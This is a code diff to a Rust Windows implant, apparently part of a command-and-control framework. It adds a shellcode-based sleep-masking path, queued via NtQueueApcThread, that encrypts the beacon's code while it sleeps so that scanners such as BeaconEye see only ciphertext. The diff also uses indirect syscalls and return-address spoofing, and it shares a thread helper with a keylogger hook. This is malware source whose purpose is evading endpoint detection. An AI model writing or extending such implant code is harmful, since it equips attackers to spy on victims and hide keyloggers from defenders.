@@ -69,6 +69,46 @@ pub fn foliage_enabled() -> bool {
     FOLIAGE_ENABLED.load(Ordering::Acquire)
 }
 
+/// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
+/// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
+/// real-machine validation before it can run unsupervised. The operator opts
+/// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
+/// the target. When OFF, `execute_foliage_plan` uses the data-only floor
+/// (heap mask + indirect-syscall sleep — still meaningful, just without
+/// `.text` encryption).
+///
+/// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
+/// executable stack page, and queues it via `NtQueueApcThread` against the
+/// beacon's alertable window — encrypting `.text` for the sleep window so
+/// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
+/// `.text` before the beacon resumes.
+///
+/// Mutually exclusive with the keylog hook thread: encrypting `.text` while
+/// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
+/// `.text`). When both are on, the APC path degrades to the data-only floor
+/// for that cycle (see `execute_foliage_plan`).
+static FOLIAGE_APC_ENABLED: AtomicBool = AtomicBool::new(foliage_apc_default_on());
+
+/// Compile-time default for the APC path. OFF unless `NYX_FOLIAGE_APC_ON=1`.
+const fn foliage_apc_default_on() -> bool {
+    match option_env!("NYX_FOLIAGE_APC_ON") {
+        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
+        None => false,
+    }
+}
+
+/// Arm/disarm the Foliage APC path (P4, research-grade). When armed AND the
+/// keylog hook is NOT active, `execute_foliage_plan` runs the full
+/// mask→wait→unmask cycle via the PIC thunk. Returns the previous value.
+pub fn set_foliage_apc_enabled(on: bool) -> bool {
+    FOLIAGE_APC_ENABLED.swap(on, Ordering::Release)
+}
+
+/// Whether the Foliage APC path (PIC thunk, `.text` encryption) is armed.
+pub fn foliage_apc_enabled() -> bool {
+    FOLIAGE_APC_ENABLED.load(Ordering::Acquire)
+}
+
 /// Sleep `seconds` with sleep-mask obfuscation.
 ///
 /// **With [`foliage_enabled`] ON (default)**: builds a `FoliagePlan` and
@@ -214,15 +254,37 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
     // corrupts the helper's in-flight instructions → abort. The standard fix
     // (Ekko/Foliage) uses a stack-allocated PIC thunk for the mask→wait→unmask
     // sequence so the helper never executes from .text while it's encrypted.
-    // Until that thunk lands, use the data-only floor: it masks heap regions
+    // Until that thunk lands (P4), use the data-only floor: it masks heap regions
     // (config, session key, token cache, BOF scratch) + does the indirect-
     // syscall sleep — still meaningful sleep obfuscation, just without .text
     // encryption. Strictly better than NoMask.
     //
-    // To re-enable the APC path once the PIC thunk is implemented, uncomment:
-    // if let Some(r) = &region {
-    //     if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } { return; }
-    // }
+    // P4 (PIC thunk) re-enables the APC path here, gated on:
+    //   1. FOLIAGE_APC_ENABLED (default OFF — research-grade, operator opts in
+    //      via NYX_FOLIAGE_APC_ON=1 after validating the thunk on the target).
+    //   2. !keylog::hook_is_active() — encrypting .text while the keylog hook
+    //      thread's callback (which lives in .text) is in flight corrupts it.
+    //   3. region.is_some() — we need the .text base/len.
+    //   4. execute_foliage_apc returns true (the full mask cycle completed).
+    // If any gate fails, fall through to the data-only floor.
+    //
+    // The PIC thunk (crates/implant-win/src/pic_thunk.rs) executes the
+    // mask→wait→unmask sequence from the STACK (not .text), so encrypting
+    // .text doesn't corrupt the in-flight instructions. The thunk builder is
+    // research-grade; its opcode sequence has NOT been validated on a real
+    // target in this codebase — the gate is the honesty mechanism.
+    if foliage_apc_enabled() && !crate::keylog::hook_is_active() {
+        if let Some(r) = &region {
+            crate::entry::diag_mark(b"E2_apc_attempt");
+            if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
+                crate::entry::diag_mark(b"E3_apc_ok");
+                return; // full mask cycle completed — done
+            }
+            crate::entry::diag_mark(b"F_apc_fell_back");
+            // APC path failed (protect / RC4 / wait / verify) — fall through to
+            // the data-only floor so we still sleep-mask the heap regions.
+        }
+    }
 
     // ---- Data-only floor ----
     crate::entry::diag_mark(b"E4_data_floor");
@@ -644,7 +706,13 @@ impl FoliageRaw {
 /// # Safety
 /// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
 /// entry on a new thread.
-unsafe fn raw_create_thread(
+/// Spawn a raw Win32 thread (kernel32!CreateThread) that runs entirely on raw
+/// exports — bypassing the shared indirect-syscall trampoline (`syscalls::global()`).
+///
+/// `pub(crate)` so the keylog hook thread (P2) can reuse this without
+/// duplicating the CreateThread resolution. Returns the thread handle (owned
+/// by the caller; Close via `NtClose`).
+pub(crate) unsafe fn raw_create_thread(
     entry: unsafe extern "system" fn(usize) -> u32,
     param: usize,
 ) -> Option<usize> {
